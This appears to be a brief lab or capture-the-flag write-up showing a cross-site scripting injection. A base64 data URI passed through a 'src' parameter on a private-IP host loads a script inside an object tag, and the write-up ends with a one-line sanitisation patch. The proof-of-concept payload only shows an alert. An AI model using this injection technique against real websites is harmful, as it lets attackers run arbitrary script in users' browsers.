🚨 **EXPLOIT**

The application allows injecting base64-encoded HTML/JavaScript through the src parameter:

`http://192.168.38.130/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=`

https://base64.guru/converter

Decoded payload:

```html
<script>
  alert("xss");
</script>
```

This base64 content is injected inside an HTML element like:

```html
<object data=""></object>
```

allowing execution of arbitrary JavaScript and leading to XSS (Cross-Site Scripting).

---

✅ **PATCH**

Sanitize HTML to prevent XSS injection
